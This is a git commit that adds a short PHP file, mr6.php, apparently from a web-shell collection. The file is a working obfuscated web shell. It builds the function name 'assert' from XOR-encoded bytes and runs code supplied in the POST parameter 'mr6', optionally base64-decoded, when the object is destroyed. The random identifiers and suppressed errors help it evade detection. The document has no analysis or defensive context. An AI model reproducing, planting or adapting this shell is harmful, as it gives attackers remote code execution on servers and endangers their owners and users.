7f129aea9e17738ea817fdb0c4ab152bb1204140
momika233 <56291820+momika233@users.noreply.github.com>
2026-03-02 10:14:31 +0800

    Create mr6.php

---
+++ mr6.php
@@ -0,0 +1,20 @@
+<?php 
+class VNJD { 
+    function iEhu() {
+        $Mmqu = "\x36" ^ "\x57";
+        $KVaC = "\x88" ^ "\xfb";
+        $VjEC = "\xc0" ^ "\xb3";
+        $Wtre = "\xd3" ^ "\xb6";
+        $Uynf = "\x46" ^ "\x34";
+        $qWwZ = "\x37" ^ "\x43";
+        $SUGK =$Mmqu.$KVaC.$VjEC.$Wtre.$Uynf.$qWwZ;
+        return $SUGK;
+    }
+    function __destruct(){
+        $GEeV=$this->iEhu();
+        @$GEeV($this->Cf);
+    }
+}
+$vnjd = new VNJD();
+@$vnjd->Cf = isset($_GET['id'])?base64_decode($_POST['mr6']):$_POST['mr6'];
+?>
